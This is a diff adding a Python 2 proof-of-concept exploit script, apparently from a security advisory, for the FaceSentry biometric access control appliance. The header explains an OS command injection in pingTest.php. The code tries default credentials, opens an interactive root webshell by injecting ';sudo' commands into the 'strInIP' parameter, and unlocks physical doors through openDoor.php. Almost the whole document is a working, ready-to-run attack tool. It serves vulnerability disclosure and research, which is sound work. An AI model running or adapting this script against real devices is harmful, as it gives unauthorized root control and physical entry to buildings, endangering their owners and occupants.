@@ -1,0 +1,216 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+#
+# FaceSentry Access Control System 6.4.8 Remote Root Exploit
+#
+#
+# Vendor: iWT Ltd.
+# Product web page: http://www.iwt.com.hk
+# Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
+#                   Firmware 5.7.2 build 568 (Algorithm A14)
+#                   Firmware 5.7.0 build 539 (Algorithm A14)
+#
+# Summary: FaceSentry 5AN is a revolutionary smart identity
+# management appliance that offers entry via biometric face
+# identification, contactless smart card, staff ID, or QR-code.
+# The QR-code upgrade allows you to share an eKey with guests
+# while you're away from your Office and monitor all activity
+# via the web administration tool. Powered by standard PoE
+# (Power over Ethernet), FaceSEntry 5AN can be installed in
+# minutes with only 6 screws. FaceSentry 5AN is a true enterprise
+# grade access control or time-and-attendance appliance.
+#
+# Desc: FaceSentry suffers from an authenticated OS command
+# injection vulnerability using default credentials. This can
+# be exploited to inject and execute arbitrary shell commands
+# as the root user via the 'strInIP' POST parameter in pingTest
+# PHP script.
+#
+# ==============================================================
+# /pingTest.php:
+# --------------
+# 8:  if (!isAuth('TestTools','R')){
+# 9:      echo "No Permission";
+# 10:     include("footer.php");
+# 11:     exit;
+# 12:  }
+# 13:
+# 14: if(isset($_POST["strInIP"])){
+# 15:     $strInIP = $_POST["strInIP"];
+# 16: }else{
+# 17:     $strInIP = "";
+# 18: }
+# 19:
+# 20: $strOperationResult = "";
+# 21: if ($strInIP != ""){
+# 22:
+# 23:    $out = array(); 
+# 24:    exec("sudo ping -c 4 $strInIP",$out);
+# 25:    $result = "";    
+# 26:    foreach($out as $line){
+# 27:        $result = $result.$line."<br>";        
+# 28:    }
+# ==============================================================
+#
+# Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
+#            Linux 3.4.113-sun8i (armv7l)
+#            PHP/7.0.30-0ubuntu0.16.04.1
+#            PHP/7.0.22-0ubuntu0.16.04.1
+#            lighttpd/1.4.35
+#            Armbian 5.38
+#            Sunxi Linux (sun8i generation)
+#            Orange Pi PC +
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2019-5525
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5525.php
+#
+#
+# 28.05.2019
+#
+
+import datetime########INITIALIZE
+import urllib2#########BIOMETRICS
+import urllib##########FACIAL.REC
+import time############OGNITION.S
+import sys##(.)###(.)##YSTEM.DOOR
+import re#######O######UNLOCKED.A
+import os#######_######CCESS.GRAN
+import io######(_)#####TED.0B1000
+import py##############1.11111011
+
+from cookielib import CookieJar
+
+global pajton
+pajton = os.path.basename(sys.argv[0])
+
+def usage():
+    if len(sys.argv) < 2:
+        print '[+] Usage: ./' + pajton + ' <ip>\n'
+        sys.exit()
+
+def auth():
+    brojac = 0
+    usernames = [ 'admin', 'user', 'administrator' ] # case sensitive
+    passwords = [ '123', '123', '123456' ]
+    while brojac < 3:
+        podatoci = { 'strInLogin'    : usernames[brojac],
+                     'strInPassword' : passwords[brojac],
+                     'saveLogin'     : '1',
+                     'saveFor'       : '168' } # 7 days
+        print '[+] Trying creds ' + usernames[brojac] + ':' + passwords[brojac]
+        nesto_encode = urllib.urlencode(podatoci)
+        ajde.open('http://' + target + '/login.php', nesto_encode)
+        check = ajde.open('http://' + target + '/sentryInfo.php')
+        dool = re.search(r'Hardware Key', check.read())
+        if dool:
+            print '[+] That worked!'
+            break
+        else:
+            brojac += 1
+            if brojac == 3:
+                print '[!] Ah ah ah. You didn\'t say the magic word!'
+                sys.exit()
+
+def door():
+    unlock = raw_input('[*] Unlock door No.: ') # default door number = 0
+    try:
+        br = int(unlock)
+        panel = { 'strInAction'           : 'openDoor',
+                  'strInPanelNo'          : br,
+                  'strInRestartAction'    : '',
+                  'strPanelIDRestart'     : '',
+                  'strPanelRestartAction' : '' }
+        nesto_encode = urllib.urlencode(panel)
+        ajde.open('http://' + target + '/openDoor.php', nesto_encode)
+        print '[+] Door ' + unlock + ' is unlocked!'
+    except ValueError:
+        print '[!] Only values from 0 to 8 are valid.'
+        door()
+
+def main():
+    if os.name == 'posix':
+        os.system('clear')
+    if os.name == 'nt':
+        os.system('cls')
+
+    vremetodeneska = datetime.datetime.now()
+    kd = vremetodeneska.strftime('%d.%m.%Y %H:%M:%S')
+    print 'Starting exploit at ' + kd
+
+    print '''
+──────────────────────────────────
+──FaceSentry Access Control System
+────────Remote Root Exploit
+─────────Zero Science Lab
+────────www.zeroscience.mk
+───────────ZSL-2019-5525
+─────────────▄▄▄▄▄▄▄▄▄
+─────────────▌▐░▀░▀░▀▐
+─────────────▌░▌░░░░░▐
+─────────────▌░░░░░░░▐
+─────────────▄▄▄▄▄▄▄▄▄
+───────▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
+──────█▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
+─────▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
+─────▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
+─────▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
+─────▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
+─────▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
+─────▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
+─────▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
+─────▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
+─────▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
+──────█▀▀▀▀█─▌███▌███▌─█▀▀▀▀█
+──────▐░░░░▌─▌███▌███▌─▐░░░░▌
+───────▀▀▀▀──▌███▌███▌──▀▀▀▀
+─────────────▌███▌███▌
+─────────────▌███▌███▌
+───────────▐▀▀▀██▌█▀▀▀▌
+▒▒▒▒▒▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒▒▒▒▒
+    '''
+
+    usage()
+    tegla = CookieJar()
+    global ajde, target
+    target = sys.argv[1]
+    ajde = urllib2.build_opener(urllib2.HTTPCookieProcessor(tegla))
+    auth()
+    raw_input('\n[*] Press [ENTER] to land... ')
+
+    print '[+] Entering interactive (web)shell...'
+    time.sleep(1)
+    print
+
+    while True:
+        try:
+            cmd = raw_input('root@facesentry:~# ')
+            if 'exit' in cmd.strip():
+                print '[+] Take care now, bye bye then!'
+                break
+            if 'door' in cmd.strip():
+                door()
+                continue
+            podatoci = { 'strInIP' : ';sudo ' + cmd } # |cmd
+            nesto_encode = urllib.urlencode(podatoci)
+            r_izraz = ajde.open('http://' + target + '/pingTest.php?', nesto_encode)
+            pattern = re.search(cmd+'\)<[^>]*>(.*?)</font>', r_izraz.read())
+            x = pattern.groups()[0].strip()
+            y = x.replace('<br>', '\n')
+            print y.strip()
+        except Exception as i:
+            print '[-] Error: ' + i.message
+            pass
+        except KeyboardInterrupt as k:
+            print '\n[+] Interrupter!'
+            sys.exit()
+
+    sys.exit()
+
+if __name__ == "__main__":
+    main()
